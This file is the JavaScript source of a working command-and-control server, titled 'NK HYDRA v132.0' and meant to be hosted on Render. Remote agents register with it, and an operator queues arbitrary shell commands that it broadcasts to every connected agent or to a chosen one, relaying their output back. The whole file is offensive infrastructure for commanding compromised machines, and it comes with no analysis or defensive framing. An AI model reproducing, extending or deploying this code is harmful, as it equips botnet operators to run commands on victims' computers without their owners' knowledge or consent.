// TYPE: NODE.JS C2 SERVER (RUN ON RENDER)
// NK HYDRA v132.0 [GOD MODE STABLE QUEUE]

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

// --- ANTI-CRASH HANDLERS ---
process.on('uncaughtException', (err) => {
    console.error('CRITICAL: Uncaught Exception:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('CRITICAL: Unhandled Rejection:', reason);
});

const app = express();
app.use(cors());

app.get('/', (req, res) => { 
    res.json({ 
        status: 'online', 
        version: 'v132.0', 
        agents: agents.length,
        queue: commandQueue.length
    }); 
});

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingInterval: 25000, 
    pingTimeout: 60000,
    transports: ['polling', 'websocket'] 
});

let agents = []; 

// --- COMMAND QUEUE SYSTEM (RENDER STABILITY) ---
// Prevents server crash when broadcasting 50+ commands instantly
const commandQueue = [];
let isProcessingQueue = false;

const processQueue = async () => {
    if (isProcessingQueue || commandQueue.length === 0) return;
    isProcessingQueue = true;

    while (commandQueue.length > 0) {
        const task = commandQueue.shift();
        if (task) {
            try {
                // Execute Task
                if (task.targetId === 'all') {
                    io.emit('exec_cmd', { cmd: task.cmd });
                } else {
                    const agent = agents.find(a => a.id === task.targetId);
                    if (agent && agent.socketId) {
                         io.to(agent.socketId).emit('exec_cmd', { cmd: task.cmd });
                    }
                }
                // Log only occasionally to save bandwidth
                if (Math.random() > 0.8) {
                    io.to('ui_room').emit('agent_event', { type: 'INFO', agentId: 'C2', payload: `Processing Queue: ${task.cmd}` });
                }
            } catch (e) {
                console.error("Queue Exec Error:", e);
            }
        }
        // Artificial Delay to prevent CPU Spike on Render Free Tier
        await new Promise(r => setTimeout(r, 150)); 
    }
    isProcessingQueue = false;
};

io.on('connection', (socket) => {
    
    socket.on('identify', (data) => {
        try {
            if (data.type === 'ui') {
                socket.join('ui_room');
                socket.emit('agents_list', agents);
                return;
            }

            console.log(`[+] Agent Identified: ${data.id}`);
            
            // Deduplicate
            agents = agents.filter(a => a.id !== data.id);
            
            agents.push({ 
                ...data, 
                socketId: socket.id, 
                status: 'Online', 
                lastSeen: Date.now() 
            });
            
            io.to('ui_room').emit('agents_list', agents);
        } catch (e) {
            console.error("Identify Error:", e);
        }
    });

    socket.on('exec_cmd', (data) => {
        try {
            const { targetId, cmd } = data;
            // PUSH TO QUEUE INSTEAD OF EXECUTING IMMEDIATELY
            commandQueue.push({ targetId, cmd });
            console.log(`[QUEUE] ${cmd} -> ${targetId} (Size: ${commandQueue.length})`);
            
            io.to('ui_room').emit('agent_event', { type: 'INFO', agentId: 'C2', payload: `Queued: ${cmd}` });
            
            // Trigger processing
            processQueue();

        } catch (e) {
            console.error("Exec Error:", e);
        }
    });
    
    socket.on('agent_event', (data) => {
        try {
            io.to('ui_room').emit('agent_event', data);
        } catch (e) { console.error("Relay Error:", e); }
    });

    socket.on('disconnect', () => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) { 
            agent.status = 'Offline'; 
            io.to('ui_room').emit('agents_list', agents);
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`HYDRA v132 LISTENING ON ${PORT}`));

